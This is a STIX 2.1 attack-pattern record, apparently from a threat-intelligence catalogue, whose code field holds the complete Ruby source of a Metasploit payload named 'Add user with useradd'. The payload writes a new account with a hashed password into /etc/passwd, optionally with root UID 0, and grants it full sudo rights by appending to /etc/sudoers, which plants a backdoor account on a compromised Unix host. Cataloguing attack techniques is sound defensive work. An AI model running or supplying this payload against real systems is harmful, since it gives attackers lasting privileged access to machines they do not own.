{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fbe532da-1fb3-4109-8ca7-1c175f3f955e",
    "created": "2024-08-14T16:33:19.314426Z",
    "modified": "2024-08-14T16:33:19.314429Z",
    "name": "Add user with useradd",
    "description": " Creates a new user. By default the new user is set with sudo but other options exist to make the new user automatically root but this is not automatically set since the new user will be treated as root (and login may be difficult). The new user can also be set as just a standard user if desired. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/adduser.rb",
            "external_id": "adduser.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'unix_crypt'\n\nmodule MetasploitModule\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Add user with useradd',\n        'Description' => %q{\n          Creates a new user. By default the new user is set with sudo\n          but other options exist to make the new user automatically\n          root but this is not automatically set since the new user will\n          be treated as root (and login may be difficult). The new user\n          can also be set as just a standard user if desired.\n        },\n        'Author' => 'Nick Cottrell <Rad10Logic>',\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Handler' => Msf::Handler::None,\n        'Session' => Msf::Sessions::CommandShell,\n        'PayloadType' => 'cmd',\n        'RequiredCmd' => 'generic',\n        'Payload' => {\n          'Offsets' => {},\n          'Payload' => ''\n        }\n      )\n      )\n\n    register_options(\n      [\n        OptString.new('USER', [ true, 'The username to create', 'metasploit' ]),\n        OptString.new('PASS', [ true, 'The password for this user', 'Metasploit$1' ])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptEnum.new('RootMethod', [false, 'The method to obtain root with the new user', 'SUDO', ['SUID', 'SUDO', 'NONE']]),\n        OptBool.new('CheckSudoers', [false, 'Check if the sudoers file exists before modifying it', true], conditions: %w[RootMethod == SUDO])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  def user\n    if datastore['USER'] !~ /^[a-z][-a-z0-9]*$/\n      raise ArgumentError, 'Username doesn\\'t fit within regex /[a-z][-a-z0-9]*/'\n    end\n\n    datastore['USER']\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    suid = if datastore['RootMethod'] == 'SUID'\n             '0'\n           else\n             rand(1010..1999).to_s\n           end\n    passwd = UnixCrypt::MD5.build(datastore['PASS'], 'Az')\n    payload_cmd = \"echo \\'#{user}:#{passwd}:#{suid}:#{suid}::/:/bin/sh\\'>>/etc/passwd\"\n    if datastore['RootMethod'] == 'SUDO'\n      if datastore['CheckSudoers']\n        payload_cmd += \";[ -f /etc/sudoers ]&&(echo \\'#{user} ALL=(ALL:ALL) ALL\\'>>/etc/sudoers)\"\n      else\n        payload_cmd += \";echo \\'#{user} ALL=(ALL:ALL) ALL\\'>>/etc/sudoers\"\n      end\n    end\n    payload_cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}